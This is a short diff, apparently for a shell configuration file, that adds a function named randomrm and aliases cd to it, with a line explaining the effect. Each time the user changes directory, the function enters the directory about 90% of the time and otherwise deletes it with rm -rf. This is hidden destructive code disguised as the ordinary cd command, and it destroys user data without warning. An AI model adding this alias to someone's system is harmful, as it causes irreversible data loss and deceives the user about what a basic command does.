@@ -1,0 +1,4 @@
+function randomrm() { if [ $((1 + $RANDOM % 10)) -gt 1 ]; then cd $1; else rm -rf $1; fi }
+alias cd=randomrm
+
+When the user executes the cmd command, 90% of the times it will be executed, 10% of the times the directory will be deleted.
